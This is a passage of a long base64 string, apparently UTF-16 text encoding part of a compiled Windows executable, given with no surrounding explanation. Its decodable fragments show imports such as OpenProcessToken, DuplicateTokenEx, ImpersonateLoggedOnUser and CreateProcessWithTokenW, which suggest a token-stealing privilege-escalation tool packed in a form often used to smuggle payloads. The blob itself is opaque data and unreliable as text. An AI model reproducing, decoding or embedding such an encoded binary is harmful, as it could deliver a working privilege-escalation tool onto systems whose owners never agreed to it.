AQQBBAEQARQBQAGcAQQBBAEoARABBAEEAQQBCAHcAOQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEgANAAvAEEAQQBBAEEATQBBAEEAQQBqAEQAMABBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAHIARAA4AEEAQQBIAEEAdwBBAEEAQwBVAFAAUQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBADgAUQBBAEEAQQBlAEQAQQBBAEEARABBACsAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBJAEIAQwBBAEEAQQBVAE0AUQBBAEEAMwBEADAAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBvAEUASQBBAEEATQBBAHcAQQBBAEMANABQAFEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEARABDAFEAZwBBAEEAbgBEAEEAQQBBAE4AUQA5AEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEATwBKAEMAQQBBAEMANABNAEEAQQBBAHoARAAwAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBrAE0AQQBBAEwAQQB3AEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBHAFkALwBBAEEAQgBPAFAAdwBBAEEAUABqADgAQQBBAEMAUQAvAEEAQQBBAEsAUAB3AEEAQQA5AGoANABBAEEATwBZACsAQQBBAEQAUwBQAGcAQQBBAEEAQQBBAEEAQQBMAFkAKwBBAEEAQwBrAFAAZwBBAEEAawBqADQAQQBBAEkASQArAEEAQQBCAG0AUABnAEEAQQBXAEQANABBAEEARQBRACsAQQBBAEIAQQBRAHcAQQBBAFgAawBNAEEAQQBIAEoARABBAEEAQwBPAFEAdwBBAEEASgBFAE0AQQBBAEsAaABEAEEAQQBDACsAUQB3AEEAQQAxAEUATQBBAEEATwA1AEQAQQBBAEEARQBSAEEAQQBBAEcARQBRAEEAQQBBAEEAQQBBAEEAQwBNAFAAdwBBAEEAQQBBAEEAQQBBAEEASgBBAEEAQQBBAGkAUQBBAEEAQQAwAEQAOABBAEEATABvAC8AQQBBAEQAbwBQAHcAQQBBAEcARQBBAEEAQQBDAHgARQBBAEEAQQAyAFIAQQBBAEEAQQBBAEEAQQBBAFAAWgBCAEEAQQBDAHMAUQBBAEEAQQBGAGsASQBBAEEASwBCAEEAQQBBAEEAQQBBAEEAQQBBADQARQBFAEEAQQBBAEEAQQBBAEEARABZAFEAQQBBAEEAQQBBAEEAQQBBAEgAcABBAEEAQQBDAG8AUQBRAEEAQQBuAGsARQBBAEEAQgA1AEMAQQBBAEEANgBRAGcAQQBBAFYAawBJAEEAQQBHAFIAQwBBAEEAQgAwAFEAZwBBAEEAawBFAEUAQQBBAEkASgBCAEEAQQBCAHMAUQBRAEEAQQBzAGsARQBBAEEARQBwAEIAQQBBAEEAbwBRAFEAQQBBAEIAawBFAEEAQQBPAHgAQQBBAEEAQgBrAFEAUQBBAEEAeQBFAEEAQQBBAEwAWgBBAEEAQQBCAFcAUQBRAEEAQQBBAEEAQQBBAEEARwBCAEEAQQBBAEIATwBRAEEAQQBBAGQARQBFAEEAQQBBAFoAQwBBAEEAQQBBAEEAQQBBAEEARgB3AEoASABaAFgAUgBEAGQAWABKAHkAWgBXADUAMABVAEgASgB2AFkAMgBWAHoAYwB3AEEATgBCAEUAOQB3AFoAVwA1AFEAYwBtADkAagBaAFgATgB6AEEAUAB3AEEAUQAzAEoAbABZAFgAUgBsAFYARwA5AHYAYgBHAGgAbABiAEgAQQB6AE0AbABOAHUAWQBYAEIAegBhAEcAOQAwAEEAQQBCAGgAQQBrAGQAbABkAEUAeABoAGMAMwBSAEYAYwBuAEoAdgBjAGcAQQBBAEwAZwBSAFEAYwBtADkAagBaAFgATgB6AE0AegBKAE8AWgBYAGgAMABWAHcAQQBBAEwAQQBSAFEAYwBtADkAagBaAFgATgB6AE0AegBKAEcAYQBYAEoAegBkAEYAYwBBAGgAZwBCAEQAYgBHADkAegBaAFUAaABoAGIAbQBSAHMAWgBRAEIATABSAFYASgBPAFIAVQB3AHoATQBpADUAawBiAEcAdwBBAEEAUABFAEEAUgBIAFYAdwBiAEcAbABqAFkAWABSAGwAVgBHADkAcgBaAFcANQBGAGUAQQBBAEEAZQB3AEYASABaAFgAUgBWAGMAMgBWAHkAVABtAEYAdABaAFYAYwBBAEEAQgBVAEMAVAAzAEIAbABiAGwAQgB5AGIAMgBOAGwAYwAzAE4AVQBiADIAdABsAGIAZwBBAEEAaQB3AEYASgBiAFgAQgBsAGMAbgBOAHYAYgBtAEYAMABaAFUAeAB2AFoAMgBkAGwAWgBFADkAdQBWAFgATgBsAGMAZwBDAE4AQQBFAE4AeQBaAFcARgAwAFoAVgBCAHkAYgAyAE4AbABjADMATgBYAGEAWABSAG8AVgBHADkAcgBaAFcANQBYAEEATQBFAEMAVQBtAFYAMgBaAFgASgAwAFYARwA5AFQAWgBXAHgAbQBBAEEAQQBmAEEARQBGAGsAYQBuAFYAegBkAEYAUgB2AGEAMgBWAHUAVQBIAEoAcABkAG0AbABzAFoAVwBkAGwAYwB3AEMAdgBBAFUAeAB2AGIAMgB0ADEAYwBGAEIAeQBhAFgAWgBwAGIARwBWAG4AWgBWAFoAaABiAEgAVgBsAFYAdwBCAEIAUgBGAFoAQgBVAEUAawB6AE0AaQA1AGsAYgBHAHcAQQBBAEkANABDAFAAMQA5AFkAYgBHAFYAdQBaADMAUgBvAFgAMgBWAHkAYwBtADkAeQBRAEgATgAwAFoARQBCAEEAVwBVAEYAWQBVAEUASgBFAFEARgBvAEEAVABWAE4AVwBRADEAQQB4AE4ARABBAHUAWgBHAHgAcwBBAEEAQQBRAEEARgA5AGYAUQAzAGgANABSAG4ASgBoAGIAVwBWAEkAWQBXADUAawBiAEcAVgB5AE0AdwBBAEEASQBRAEIAZgBYADMATgAwAFoARgA5AGwAZQBHAE4AbABjAEgAUgBwAGIAMgA1AGYAWQAyADkAdwBlAFEAQQBBAEkAZwBCAGYAWAAzAE4AMABaAEYAOQBsAGUARwBOAGwAYwBIAFIAcABiADIANQBmAFoARwBWAHoAZABIAEoAdgBlAFEAQQBCAEEARgA5AEQAZQBIAGgAVQBhAEgASgB2AGQAMABWADQAWQAyAFYAdwBkAEcAbAB2AGIAZwBBAEEAUwBBAEIAdABaAFcAMQB6AFoAWABRAEEAQQBEAFUAQQBYADIAVgA0AFkAMgBWAHcAZABGADkAbwBZAFcANQBrAGIARwBWAHkATgBGADkAagBiADIAMQB0AGIAMgA0AEEAVgBrAE4AUwBWAFUANQBVAFMAVQAxAEYATQBUAFEAdwBMAG0AUgBzAGIAQQBBAEEAQQBBAEIAZgBYADIARgBqAGMAbgBSAGYAYQBXADkAaQBYADIAWgAxAGIAbQBNAEEAQQB3AEIAZgBYADMATgAwAFoARwBsAHYAWAAyAE4AdgBiAFcAMQB2AGIAbAA5ADIAWgBuAEIAeQBhAFcANQAwAFoAZwBBADcAQQBGADkAcABiAG4AWgBoAGIARwBsAGsAWAAzAEIAaABjAG0ARgB0AFoAWABSAGwAYwBsADkAdQBiADIAbAB1AFoAbQA5AGYAYgBtADkAeQBaAFgAUgAxAGMAbQA0AEEAQQBBAGcAQQBYADIATgBoAGIARwB4AHUAWgBYAGQAbwBBAEIAawBBAGIAVwBGAHMAYgBHADkAagBBAEEAQgBDAEEARgA5AHoAWgBXAGgAZgBaAG0AbABzAGQARwBWAHkAWAAyAFYANABaAFEAQgBFAEEARgA5AHoAWgBYAFIAZgBZAFgAQgB3AFgAMwBSADUAYwBHAFUAQQBMAGcAQgBmAFgAMwBOAGwAZABIAFYAegBaAFgASgB0AFkAWABSAG8AWgBYAEoAeQBBAEEAQQBaAEEARgA5AGoAYgAyADUAbQBhAFcAZAAxAGMAbQBWAGYAYgBtAEYAeQBjAG0AOQAzAFgAMgBGAHkAWgAzAFkAQQBBAEQAVQBBAFgAMgBsAHUAYQBYAFIAcABZAFcAeABwAGUAbQBWAGYAYgBtAEYAeQBjAG0AOQAzAFgAMgBWAHUAZABtAGwAeQBiADIANQB0AFoAVwA1ADAAQQBBAEEAcQBBAEYAOQBuAFoAWABSAGYAYQBXADUAcABkAEcAbABoAGIARgA5AHUAWQBYAEoAeQBiADMAZABmAFoAVwA1ADIAYQBYAEoAdgBiAG0AMQBsAGIAbgBRAEEATwBBAEIAZgBhAFcANQBwAGQASABSAGwAYwBtADAAQQBPAFEAQgBmAGEAVwA1AHAAZABIAFIAbABjAG0AMQBmAFoAUQBCAFkAQQBHAFYANABhAFgAUQBBAEEAQwBVAEEAWAAyAFYANABhAFgAUQBBAFYAQQBCAGYAYwAyAFYAMABYADIAWgB0AGIAMgBSAGwAQQBBAEEARgBBAEYAOQBmAGMARgA5AGYAWAAyAEYAeQBaADIATQBBAEEAQQBZAEEAWAAxADkAdwBYADEAOQBmAFkAWABKAG4AZABnAEEAQQBGAHcAQgBmAFkAMgBWADQAYQBYAFEAQQBBAEIAWQBBAFgAMgBOAGYAWgBYAGgAcABkAEEAQQAvAEEARgA5AHkAWgBXAGQAcABjADMAUgBsAGMAbAA5ADAAYQBIAEoAbABZAFcAUgBmAGIARwA5AGoAWQBXAHgAZgBaAFgAaABsAFgAMgBGADAAWgBYAGgAcABkAEYAOQBqAFkAVwB4AHMAWQBtAEYAagBhAHcAQQBBAEMAQQBCAGYAWQAyADkAdQBaAG0AbABuAGQARwBoAHkAWgBXAEYAawBiAEcAOQBqAFkAVwB4AGwAQQBCAFkAQQBYADMATgBsAGQARgA5AHUAWgBYAGQAZgBiAFcAOQBrAFoAUQBBAEIAQQBGADkAZgBjAEYAOQBmAFkAMgA5AHQAYgBXADkAawBaAFEAQQBBAEcAQQBCAG0AYwBtAFYAbABBAEEAQQAyAEEARgA5AHAAYgBtAGwAMABhAFcARgBzAGEAWABwAGwAWAAyADkAdQBaAFgAaABwAGQARgA5ADAAWQBXAEoAcwBaAFEAQQBBAFAAZwBCAGYAYwBtAFYAbgBhAFgATgAwAFoAWABKAGYAYgAyADUAbABlAEcAbAAwAFgAMgBaADEAYgBtAE4AMABhAFcAOQB1AEEAQgA4AEEAWAAyAE4AeQBkAEYAOQBoAGQARwBWADQAYQBYAFEAQQBIAFEAQgBmAFkAMgA5AHUAZABIAEoAdgBiAEcAWgB3AFgAMwBNAEEAQQBHAG8AQQBkAEcAVgB5AGIAVwBsAHUAWQBYAFIAbABBAEcARgB3AGEAUwAxAHQAYwB5ADEAMwBhAFcANAB0AFkAMwBKADAATABYAE4AMABaAEcAbAB2AEwAVwB3AHgATABUAEUAdABNAEMANQBrAGIARwB3AEEAWQBYAEIAcABMAFcAMQB6AEwAWABkAHAAYgBpADEAagBjAG4AUQB0AGMAbgBWAHUAZABHAGwAdABaAFMAMQBzAE0AUwAwAHgATABUAEEAdQBaAEcAeABzAEEARwBGAHcAYQBTADEAdABjAHkAMQAzAGEAVwA0AHQAWQAzAEoAMABMAFcAaABsAFkAWABBAHQAYgBEAEUAdABNAFMAMAB3AEwAbQBSAHMAYgBBAEEAQQBZAFgAQgBwAEwAVwAxAHoATABYAGQAcABiAGkAMQBqAGMAbgBRAHQAYgBXAEYAMABhAEMAMQBzAE0AUwAwAHgATABUAEEAdQBaAEcAeABzAEEAQQBCAGgAYwBHAGsAdABiAFgATQB0AGQAMgBsAHUATABXAE4AeQBkAEMAMQBzAGIAMgBOAGgAYgBHAFUAdABiAEQARQB0AE0AUwAwAHcATABtAFIAcwBiAEEAQQBBAHIAUQBWAFYAYgBtAGgAaABiAG0AUgBzAFoAVwBSAEYAZQBHAE4AbABjAEgAUgBwAGIAMgA1AEcAYQBXAHgAMABaAFgASQBBAEEARwAwAEYAVQAyAFYAMABWAFcANQBvAFkAVwA1AGsAYgBHAFYAawBSAFgAaABqAFoAWABCADAAYQBXADkAdQBSAG0AbABzAGQARwBWAHkAQQBJAHcARgBWAEcAVgB5AGIAVwBsAHUAWQBYAFIAbABVAEgASgB2AFkAMgBWAHoAYwB3AEEAQQBoAGcATgBKAGMAMQBCAHkAYgAyAE4AbABjADMATgB2AGMAawBaAGwAWQBYAFIAMQBjAG0AVgBRAGMAbQBWAHoAWgBXADUAMABBAEUAMABFAFUAWABWAGwAYwBuAGwAUQBaAFgASgBtAGIAMwBKAHQAWQBXADUAagBaAFUATgB2AGQAVwA1ADAAWgBYAEkAQQBHAEEASgBIAFoAWABSAEQAZABYAEoAeQBaAFcANQAwAFUASABKAHYAWQAyAFYAegBjADAAbABrAEEAQgB3AEMAUgAyAFYAMABRADMAVgB5AGMAbQBWAHUAZABGAFIAbwBjAG0AVgBoAFoARQBsAGsAQQBBAEQAcABBAGsAZABsAGQARgBOADUAYwAzAFIAbABiAFYAUgBwAGIAVwBWAEIAYwAwAFoAcABiAEcAVgBVAGEAVwAxAGwAQQBHAE0ARABTAFcANQBwAGQARwBsAGgAYgBHAGwANgBaAFYATgBNAGEAWABOADAAUwBHAFYAaABaAEEAQgAvAEEAMABsAHoAUgBHAFYAaQBkAFcAZABuAFoAWABKAFEAYwBtAFYAegBaAFcANQAwAEEASABnAEMAUgAyAFYAMABUAFcAOQBrAGQAVwB4AGwAUwBHAEYAdQBaAEcAeABsAFYAdwBBAEEAUgBnAEIAdABaAFcAMQBqAGMASABrAEEAQQBFAGMAQQBiAFcAVgB0AGIAVwA5ADIAWgBRAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAcwBSAG0ALwBSAEUANwBtAFEATAB2AC8ALwAvAC8ALwBBAFEAQQBBAEEAQQBFAEEAQQBBAEEAQgBBAEEAQQBBAHoARABGAEEAQQBBAEEAQQBBAEEAQQB1AFAAMABGAFcAWQBtAEYAawBYADIARgBzAGIARwA5AGoAUQBIAE4AMABaAEUAQgBBAEEATQB3AHgAUQBBAEEAQQBBAEEAQQBBAEwAagA5AEIAVgBtAFYANABZADIAVgB3AGQARwBsAHYAYgBrAEIAegBkAEcAUgBBAFEAQQBEAE0ATQBVAEEAQQBBAEEAQQBBAEEAQwA0AC8AUQBWAFoAaQBZAFcAUgBmAFkAWABKAHkAWQBYAGwAZgBiAG0AVgAzAFgAMgB4AGwAYgBtAGQAMABhAEUAQgB6AGQARwBSAEEAUQBBAEEAQQB6AEQARgBBAEEAQQBBAEEAQQBBAEEAdQBQADAARgBXAGQASABsAHcAWgBWADkAcABiAG0AWgB2AFEARQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEARQBBAEcAQQBBAEEAQQBCAGcAQQBBAEkAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEUAQQBBAFEAQQBBAEEARABBAEEAQQBJAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBFAEEAQwBRAFEAQQBBAEUAZwBBAEEAQQBCAGcAWQBBAEEAQQBmAFEARQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQA4AFAAMwBoAHQAYgBDAEIAMgBaAFgASgB6AGEAVwA5AHUAUABTAGMAeABMAGoAQQBuAEkARwBWAHUAWQAyADkAawBhAFcANQBuAFAAUwBkAFYAVgBFAFkAdABPAEMAYwBnAGMAMwBSAGgAYgBtAFIAaABiAEcAOQB1AFoAVAAwAG4AZQBXAFYAegBKAHoAOAArAEQAUQBvADgAWQBYAE4AegBaAFcAMQBpAGIASABrAGcAZQBHADEAcwBiAG4ATQA5AEoAMwBWAHkAYgBqAHAAegBZADIAaABsAGIAVwBGAHoATABXADEAcABZADMASgB2AGMAMgA5AG0AZABDADEAagBiADIAMAA2AFkAWABOAHQATABuAFkAeABKAHkAQgB0AFkAVwA1AHAAWgBtAFYAegBkAEYAWgBsAGMAbgBOAHAAYgAyADQAOQBKAHoARQB1AE0AQwBjACsARABRAG8AZwBJAEQAeAAwAGMAbgBWAHoAZABFAGwAdQBaAG0AOABnAGUARwAxAHMAYgBuAE0AOQBJAG4AVgB5AGIAagBwAHoAWQAyAGgAbABiAFcARgB6AEwAVwAxAHAAWQAzAEoAdgBjADIAOQBtAGQAQwAxAGoAYgAyADAANgBZAFgATgB0AEwAbgBZAHoASQBqADQATgBDAGkAQQBnAEkAQwBBADgAYwAyAFYAagBkAFgASgBwAGQASABrACsARABRAG8AZwBJAEMAQQBnAEkAQwBBADgAYwBtAFYAeABkAFcAVgB6AGQARwBWAGsAVQBIAEoAcABkAG0AbABzAFoAVwBkAGwAYwB6ADQATgBDAGkAQQBnAEkAQwBBAGcASQBDAEEAZwBQAEgASgBsAGMAWABWAGwAYwAzAFIAbABaAEUAVgA0AFoAVwBOADEAZABHAGwAdgBiAGsAeABsAGQAbQBWAHMASQBHAHgAbABkAG0AVgBzAFAAUwBkAGgAYwAwAGwAdQBkAG0AOQByAFoAWABJAG4ASQBIAFYAcABRAFcATgBqAFoAWABOAHoAUABTAGQAbQBZAFcAeAB6AFoAUwBjAGcATAB6ADQATgBDAGkAQQBnAEkAQwBBAGcASQBEAHcAdgBjAG0AVgB4AGQAVwBWAHoAZABHAFYAawBVAEgASgBwAGQAbQBsAHMAWgBXAGQAbABjAHoANABOAEMAaQBBAGcASQBDAEEAOABMADMATgBsAFkAMwBWAHkAYQBYAFIANQBQAGcAMABLAEkAQwBBADgATAAzAFIAeQBkAFgATgAwAFMAVwA1AG0AYgB6ADQATgBDAGoAdwB2AFkAWABOAHoAWgBXADEAaQBiAEgAawArAEQAUQBvAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAFEAQQBBAEMAbwBBAEEAQQBBAEEAVABBAHAATQBFADAAdwBlAGoAQwBOAE0ASgBVAHcAbgB6AEMAbABNAFAATQB3AC8AVABBAEQATQBTAE0AeABMAHoARgAyAE0AWQBnAHgAeABqAEUAeQBNADIAbwB6AGgAegBPAHYATQA4AGMAegBBAHoAUQBkAE4ARQBZADAAVwBEAFIALwBOAEwATQAwAHoAVABUAGwATgBQADgAMABjAFQAVgA0AE4AWgBBADEAcABqAFcAcwBOAGIAawAxAHkAVABYAFoATgBlADQAMQArAHoAVQBMAE4AaABzADIATABEAFkAMwBOAGwAZwAyAGsAagBhAGgATgBxADgAMgB0AHoAYgBIAE4AdQBvADIAOQB6AFkASABOAHgAYwAzAE4ARABkAEMATgAwADgAMwBYAHoAZAB2AE4ANgBrADMAcgB6AGoAOABPAFIAbwA3AFUAVAB0AFgATwAvAFUAOABTAHoAMQBTAFAAZABjADkAQQBEADUAbgBQAHAASQArAHAAegA2AHMAUAByAEUAKwAwAGoANwBYAFAAdQBRACsASABqAC8AMwBQAHcAQQBnAEEAQQBBADQAQQBRAEEAQQBBAEQAQQBMAE0AQgBJAHcATQBqAEEANABNAEQANAB3AFIARABCAEsATQBGAEEAdwBWAHoAQgBlAE0ARwBVAHcAYgBEAEIAegBNAEgAbwB3AGcAVABDAEoATQBKAEUAdwBtAFQAQwBsAE0ASwA0AHcAcwB6AEMANQBNAE0ATQB3AHoAVABEAGQATQBPADAAdwAvAFQAQQBHAE0AUwBFAHgATwBUAEUALwBNAFYAUQB4AGIARABGAHkATQBZAEkAeABxAEQARwAvAE0AZgBBAHgARABUAEkAagBNAG8ASQB5AHIAagBMAGgATQBnAGMAegBGAGoATQBwAE0AegB3AHoAUQBqAE4ASQBNADAANAB6AFYARABOAGEATQAyAEEAegBaAGoATgA3AE0ANQBBAHoAbAB6AE8AZABNADYAOAB6AHUAVABNAGgATgBDADQAMABWAFQAUgBkAE4ASABZADAAdABUAFQARQBOAE0AMAAwADIAagBUAHcATgBDAG8AMQBNAHoAVgBIAE4AVQAwADEAZQBEAFcAZQBOAGEAYwAxAHIAVABXAEwATgBxAHMAMgB0AFQAYgBWAE4AaABVADMARwB6AGQAagBOADIAdwAzAGMAVABlAEUATgA1AGcAMwBuAFQAZQB3AE4AOQBFADMANwBqAGQARwBPAEUAcwA0AFoAagBpAEMATwBKAEEANABxAHoAaQAyAE8ARQBvADUAVQB6AGwAYgBPAFoAYwA1AHEAegBtAHkATwBlAEkANQA2AHoAbgAwAE8AUQBJADYAQwB6AG8AWQBPAGkASQA2AEsARABvAHUATwBqAFEANgBPAGoAcABBAE8AawBZADYAVABEAHAAUwBPAGwAZwA2AFgAagBwAGsATwBtAG8ANgBjAEQAcAAyAE8AbgB3ADYAZwBqAHEASQBPAG8ANAA2AGwARABxAGEATwBxAEEANgBwAGoAcQBzAE8AcgBJADYAdQBEAHEAKwBPAHMAUQA2AHkAagByAFEATwB0AFkANgAzAEQAcgBpAE8AdQBnADYAOABqAHAAbQBPADIAdwA3AHAAVAB2AFgATwB3AEEAdwBBAEEAQwBZAEEAQQBBAEEASwBEAEUAdwBNAFQAdwB4AFEARABGAGcATQBXAFEAeABhAEQARgBzAE0AWABBAHgAaQBEAEcATQBNAFoAQQB4AHAARABHAG8ATQBhAHcAeAB5AEQASABNAE0AWAB3ADIAZwBEAGEASQBOAHYAQQAyADkARABZAEUATgB3AGcAMwBFAEQAYwBvAE4AegBnADMAUABEAGQATQBOADEAQQAzAFYARABkAGMATgAzAFEAMwBoAEQAZQBJAE4ANQBnADMAbgBEAGUAZwBOADYAUQAzAHIARABmAEUATgA5AFEAMwAyAEQAZgBvAE4AKwB3ADMAOQBEAGMATQBPAEQAQQA3AFUARAB0AFkATwAyAFEANwBoAEQAdQBjAE8ANgBBADcAcQBEAHUAdwBPADcAZwA3AHYARAB2AEUATwA5AGcANwA0AEQAdgAwAE8ALwB3ADcAQgBEAHcATQBQAEIAQQA4AEYARAB3AGMAUABEAEEAOABUAEQAeABRAFAAQQBBAEEAQQBGAEEAQQBBAEIAQQBBAEEAQQBBAFkATQBEAFEAdwBVAEQAQgA0AE0AQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBB